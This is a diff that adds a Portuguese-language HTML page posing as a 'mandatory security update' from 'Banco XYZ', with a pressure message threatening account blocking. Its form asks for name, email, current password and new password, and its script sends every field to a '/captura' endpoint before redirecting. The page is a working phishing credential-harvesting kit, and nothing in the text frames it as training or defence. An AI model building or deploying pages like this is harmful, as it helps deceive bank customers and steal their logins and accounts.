@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Atualização de Segurança - Banco XYZ</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+        }
+
+        .container {
+            width: 400px;
+            margin: 50px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #d9534f;
+            text-align: center;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            box-sizing: border-box;
+        }
+
+        button {
+            background: #d9534f;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🔒 Atualização de Segurança Obrigatória</h1>
+        <p>Por favor, atualize seus dados para evitar bloqueio da conta.</p>
+
+        <form id="formulario">
+            <div>
+                <label>Nome:</label>
+                <input id="nome" class="input" type="text" name="nome" required>
+            </div>
+            <div>
+                <label>Email:</label>
+                <input id="email" class="input" type="email" name="email" required>
+            </div>
+            <div>
+                <label>Senha Atual:</label>
+                <input id="senha" class="input" type="password" name="senhaAtual" required>
+            </div>
+            <div>
+                <label>Nova Senha:</label>
+                <input id="novaSenha" class="input" type="password" name="novaSenha" required>
+            </div>
+            <button id="submit" type="button">Confirmar</button>
+        </form>
+    </div>
+
+    <script>
+        const send = document.getElementById('submit');
+
+        send.addEventListener('click', event => {
+            event.preventDefault();
+
+            const obj = {};
+            const inputs = document.querySelectorAll('input');
+
+            inputs.forEach((input) => {
+                obj[input.name] = input.value;
+            });
+
+            console.log(obj);
+
+            fetch('/captura', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams(obj).toString()
+            }).then(response => response.json()).then(data => {
+                if (data.redirectTo) {
+                    window.location.href = data.redirectTo;
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
